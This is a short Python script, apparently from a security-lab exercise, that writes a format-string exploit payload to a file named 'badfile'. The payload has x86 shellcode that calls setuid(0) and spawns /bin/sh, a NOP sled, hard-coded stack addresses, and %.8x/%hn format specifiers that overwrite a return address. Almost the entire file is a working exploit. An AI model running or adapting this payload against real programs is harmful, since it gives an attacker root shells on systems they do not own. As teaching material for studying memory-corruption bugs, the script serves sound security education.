#!/usr/bin/python3

import sys

shellcode= (
  "\x31\xc0\x31\xdb\xb0\xd5\xcd\x80"                   
  "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50"
  "\x53\x89\xe1\x99\xb0\x0b\xcd\x80\x00"
).encode('latin-1')

N = 200


content = bytearray(0x90 for i in range(N))

# Put the shellcode at the end
start = N - len(shellcode)
content[start:] = shellcode

# Put the address at the beginning
addr1 = 0xbfffecdc                                    
addr2 = 0xbfffecde
content[0:4]  = (addr2).to_bytes(4,byteorder='little')
content[4:8]  = ("@@@@").encode('latin-1')
content[8:12] = (addr1).to_bytes(4,byteorder='little') 

# Add the format specifiers
C = 15
small = 0xbfff - 12 - 8*C                             
large = 0xed64 - 0xbfff
s = "%.8x"*C + "%." + str(small) + "x" + "%hn" \
             + "%." + str(large) + "x" + "%hn"
fmt  = (s).encode('latin-1')
content[12:12+len(fmt)] = fmt                          

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(content)